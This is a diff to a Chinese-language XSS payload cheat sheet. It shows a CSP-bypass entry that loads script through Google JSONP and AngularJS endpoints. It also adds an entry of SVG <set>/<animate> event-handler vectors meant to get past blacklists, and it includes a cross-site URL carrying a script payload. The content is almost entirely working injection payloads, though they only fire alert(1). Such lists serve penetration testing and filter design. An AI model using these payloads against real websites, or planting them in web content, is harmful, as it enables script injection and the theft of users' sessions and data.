@@ -346,7 +346,7 @@ http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/
 status.html&msg=<script>alert(1)</script>
 ```
 **55.CSP Bypass (for Whitelisted Google Domains) (CSP 绕过(通过谷歌白名单域名))** <br>
-以下payload用于,当存在允许这些白名单域执行CSP（内容安全策略）时使用。
+以下payload用于,当存在允许这些白名单域执行CSP（内容安全策略）时使用。<br>
 ```
 <script src=//www.google.com/complete/search?client=chrome%26jsonp=alert(1)>
 </script>
@@ -354,7 +354,12 @@ status.html&msg=<script>alert(1)</script>
 <script src=//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js>
 </script><x ng-app ng-csp>{{$new.constructor('alert(1)')()}}
 ```
-**56.**
+**56.SVG Vectors with Event Handlers (带有事件处理程序的SVG向量)** <br>
+以下payload它可以在Firefox上触发，但是通过在<set>中添加attributename=x参数也可以在Chromium中工作。用于黑名单绕过,"Set"也可以替换为"animate"。<br>
+```
+<svg><set onbegin=alert(1)>
+<svg><set end=1 onend=alert(1)>
+```
 
 
 
